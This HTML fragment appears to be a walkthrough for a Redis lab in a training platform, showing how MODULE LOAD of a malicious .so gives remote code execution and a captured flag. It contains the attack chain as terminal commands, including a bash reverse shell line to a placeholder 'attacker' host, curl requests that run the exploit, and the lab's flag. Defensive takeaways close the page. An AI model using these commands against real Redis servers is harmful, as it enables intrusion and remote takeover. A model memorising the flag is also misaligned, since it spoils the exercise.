<h4>Step 1: Enumerate Keys</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Enumerate Keys</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>KEYS *<br>
        <span class="prompt">Result: </span>system:uptime, modules:loaded, flag_vault, system:os, system:version<br><br>
        <span class="prompt">// Flag is stored in flag_vault but the real exploit path is MODULE LOAD</span>
    </div>
</div>

<h4>Step 2: Load Malicious Module</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. MODULE LOAD</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>MODULE LOAD /tmp/evil.so<br>
        <span class="prompt">Result: </span>OK -- Module 'evil' loaded successfully.<br>
        New commands available: system.exec, system.rev
    </div>
</div>

<h4>Step 3: Execute OS Command to Read the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. RCE via system.exec</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>system.exec cat /flag.txt<br>
        <span class="prompt">Result: </span><strong>FLAG{rd_m0dul3_l04d_rc3}</strong>
    </div>
</div>

<h4>Step 4: MODULE LOAD RCE (How It Works)</h4>
<p>
    Redis modules are shared libraries (.so) that extend Redis with new commands.
    <code>MODULE LOAD</code> loads a module from the filesystem, executing its
    <code>RedisModule_OnLoad()</code> function: enabling arbitrary code execution.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. MODULE LOAD Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>Write malicious .so to disk (via CONFIG SET + BGSAVE or SLAVEOF)<br><br>
        <span class="prompt">Step 2: </span>MODULE LOAD /tmp/evil.so<br>
        <span class="prompt">// Executes RedisModule_OnLoad() with full process privileges</span><br><br>
        <span class="prompt">Step 3: </span>system.exec "id"<br>
        <span class="prompt">// Custom command from loaded module executes OS commands</span><br><br>
        <span class="prompt">Step 4: </span>system.exec "bash -i >&amp; /dev/tcp/attacker/4444 0>&amp;1"<br>
        <span class="prompt">// Reverse shell as the Redis process user</span>
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the <code>system.exec cat /flag.txt</code> output:
    <code>FLAG{rd_m0dul3_l04d_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt"># Requires session cookie to persist module state across requests</span><br>
        <span class="prompt">$ </span>curl -sc /tmp/lab5.txt "http://target/SQLi-Arena/redis/lab5" -o /dev/null<br>
        <span class="prompt">$ </span>curl -sb /tmp/lab5.txt "http://target/SQLi-Arena/redis/lab5" \<br> --data-urlencode "cmd=MODULE LOAD /tmp/evil.so" -o /dev/null<br>
        <span class="prompt">$ </span>curl -sb /tmp/lab5.txt "http://target/SQLi-Arena/redis/lab5" \<br> --data-urlencode "cmd=system.exec cat /flag.txt"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>MODULE LOAD</code> is the most dangerous Redis command --
    it loads arbitrary shared libraries into the Redis process. Combined with file-write primitives
    (CONFIG SET + BGSAVE or SLAVEOF rogue server), an attacker can achieve full RCE. Tools like
    <code>RedisModules-ExecuteCommand</code> provide pre-built modules with
    <code>system.exec</code> commands. Defense: use <code>rename-command MODULE ""</code>,
    restrict filesystem write access, use Redis 6+ ACLs to limit command access, and never
    expose Redis to untrusted networks.
</div>
